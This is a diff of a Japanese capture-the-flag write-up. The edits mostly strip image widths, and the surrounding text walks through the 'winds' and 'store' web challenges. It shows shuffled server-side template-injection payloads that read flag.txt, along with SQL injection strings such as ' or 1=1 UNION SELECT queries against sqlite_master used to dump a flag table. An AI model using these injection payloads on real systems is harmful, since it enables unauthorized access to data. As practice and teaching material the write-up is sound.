@@ -153,8 +153,8 @@ cookieにこの値を設定し、`/flag`へアクセスするとflagが表示さ
 以下のようなWebページ。  
 submitすると入力した文字列が入れ替わった内容が含まれたページが生成される。
 
-<img src="./img/angstrom/winds1.png" width="500px" >
-<img src="./img/angstrom/winds2.png" width="500px" >
+<img src="./img/angstrom/winds1.png">
+<img src="./img/angstrom/winds2.png">
 
 ソースコードは与えられている。
 
@@ -248,7 +248,7 @@ def unshuffle_with_seed(shuffled_ls, seed):
 
 `gcinfo}{{}`と入力すると`{{config}}`と出力される。
 
-<img src="./img/angstrom/winds3.png" width="500px" >
+<img src="./img/angstrom/winds3.png">
 
 `{{config}}`ではflagに関する情報はなかった。
 
@@ -262,7 +262,7 @@ def unshuffle_with_seed(shuffled_ls, seed):
 iispb)t{{paus(_iol(qsl)n_.ehtr_tl(c_-irn'tooe)_.a}peb}_lm.sip.a_ad_.'poge_' u's_l.la_r_on
 ```
 
-<img src="./img/angstrom/winds5.png" width="500px" >
+<img src="./img/angstrom/winds5.png">
 
 同じディレクトリ内に`flag.txt`があることがわかったので、中身を表示する。
 ```
@@ -275,7 +275,7 @@ _ir'i)i{{cnua.isot tn__taopt)le_l(__.artos'uo)rep}me.}.psqbl(.a_xd'pf_ibn.'taall
 
 flagが得られた。
 
-<img src="./img/angstrom/winds4.png" width="500px" >
+<img src="./img/angstrom/winds4.png">
 
 
 ## store (100pts.)
@@ -283,7 +283,7 @@ flagが得られた。
 以下のようなWebページ。
 検索機能を持ったページのようだが、適当に検索してもなにもでてこない。
 
-<img src="./img/angstrom/store1.png" width="500px" >
+<img src="./img/angstrom/store1.png">
 
 js内に検証処理があるため、submitはコンソールから行う。
 ```
@@ -294,7 +294,7 @@ document.getElementsByTagName('form')[0].submit();
 ```
 ' or 1=1; -- 
 ```
-<img src="./img/angstrom/store2.png" width="500px" >
+<img src="./img/angstrom/store2.png">
 
 また以下sqliteの関数を使用しても通るため、DBがsqliteとわかる。
 ```
@@ -309,18 +309,16 @@ document.getElementsByTagName('form')[0].submit();
 ```
 ' or 1=1 UNION SELECT * FROM (SELECT sqlite_version()) AS a JOIN (SELECT 'hoge') AS b JOIN (SELECT 'fuga') AS c; -- 
 ```
-<img src="./img/angstrom/store3.png" width="500px" >
+<img src="./img/angstrom/store3.png">
 
 あとはテーブル名と構成をとるとflagを含んだテーブルがあった。
 ```
 ' or 1=1 union select * from (select null) as a join (select name from sqlite_master) as b join (select sql from sqlite_master) as c; -- 
 ```
-<img src="./img/angstrom/store4.png" width="500px" >
+<img src="./img/angstrom/store4.png">
 
 ```
 ' or 1=1 union select * from (select null) as a join (select flag from flags91b3e66b04879149597e8a26b489192a) as b join (select sql from sqlite_master) as c; -- 
 ```
-<img src="./img/angstrom/store5.png" width="500px" >
+<img src="./img/angstrom/store5.png">
 
-
-## pastebin
